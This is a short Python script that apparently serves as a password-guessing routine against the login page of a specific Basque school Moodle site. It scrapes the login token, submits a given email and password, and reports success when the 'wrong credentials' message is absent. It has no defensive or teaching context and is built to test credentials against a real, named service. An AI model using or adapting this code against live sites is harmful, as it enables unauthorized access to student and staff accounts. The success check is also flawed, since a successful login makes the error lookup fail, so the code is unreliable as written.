import requests
import time
from bs4 import BeautifulSoup

def tryPass(mail, passW):
    rGet = requests.get("https://elearning17.hezkuntza.net/015307/login/index.php")
    cookies = rGet.cookies.get_dict()

    soup = BeautifulSoup(rGet.content, 'html.parser')
    token = soup.find("input", {"name":"logintoken"}).get('value')

    data = {"username":mail, "password":passW, "anchor":"", "logintoken":token}
    rPost = requests.post("https://elearning17.hezkuntza.net/015307/login/index.php", data, cookies=cookies)

    soup2 = BeautifulSoup(rPost.content, 'html.parser')
    verify = soup2.find("a", {"id":"loginerrormessage"}).get_text()

    if verify == "Datos erróneos. Por favor, inténtelo otra vez.":
        return False
    else:
        return True
